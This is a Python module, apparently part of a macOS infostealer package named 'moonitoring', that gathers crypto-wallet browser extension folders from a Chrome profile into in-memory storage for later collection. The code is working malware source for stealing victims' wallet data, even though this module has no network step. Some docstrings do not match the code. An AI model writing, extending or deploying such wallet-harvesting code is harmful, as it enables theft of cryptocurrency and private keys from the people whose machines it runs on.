from os import path

from moonitoring.macos.helpers.config import BrowsersConfig
from moonitoring.macos.helpers.dataclasses import Data
from moonitoring.macos.helpers.storage import MemoryStorage

class Wallets:
    """
    Collects configs from the crypto wallets.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = BrowsersConfig()
        self.__storage = MemoryStorage()

    def __get_wallets_files(self, profile: str) -> None:
        """
        Collects browser wallets.

        Parameters:
        - profile [str]: Browser profile.
        - wallets [str]: Path to wallets directory.

        Returns:
        - None.
        """
        
        if not path.exists(self.__config.BrowsersPath):
            print(f"[Chrome]: No wallets found")
            return

        for wallet in self.__config.WalletsLogs:
            for extension in wallet["folders"]:
                try:

                    extension_path = path.join(wallet["path"], extension)

                    if not path.exists(extension_path):
                        continue

                    self.__storage.add_from_disk(
                        extension_path,
                        path.join("Wallets", rf'Chrome {profile} {wallet["name"]}')
                    )

                    self.__storage.add_data("Wallet", wallet["name"])

                except Exception as e:
                    print(f"[Chrome]: {repr(e)}")

    def run(self) -> Data:
        """
        Launches the crypto wallets collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_wallets_files("Default")

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Wallets]: {repr(e)}")